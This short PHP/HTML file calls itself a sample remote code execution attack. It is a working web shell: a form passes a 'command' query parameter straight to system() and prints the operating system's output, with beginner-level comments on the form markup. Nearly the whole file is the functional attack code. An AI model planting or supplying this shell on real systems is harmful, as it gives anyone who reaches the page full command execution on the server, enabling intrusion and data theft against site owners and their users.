# This is a sample piece of code to execute a RCE attack

# This script displays an input field, whatever is entered into this field is
# then run against the underlying OS using the system() function, then the
# output is displayed to the user

<html>
<body>
# Generates opening tag of an HTML form, which is used to collect user input;
# method specifies the HTTP method used to submit the form data, GET means the
# form data will be appended to the URL as query parameters, 
# e.g. '?param1=value1&param2=value2'; 'name' sets the name attribute of the form; 
# '<?php ... ?>' are PHP tags used to encapsulate the PHP code; 'basename() is
# a PHP function that extracts the filename component from a path,
# e.g. 'basename('/myform.php') would return 'myform.php'; 
# '$_SERVER['PHP_SELF'] is a superglobal variable in PHP that contains the 
# filename of the currently executing script, 
# e.g. if the script URL is 'http://example.com/myform.php' then 
# $_SERVER['PHP_SELF'] would contain '/myform.php'; TLDR: this line sets the 
# name attribute of the HTML form to the filename of the current PHP script
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command']))
    {
        system($_GET['command'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
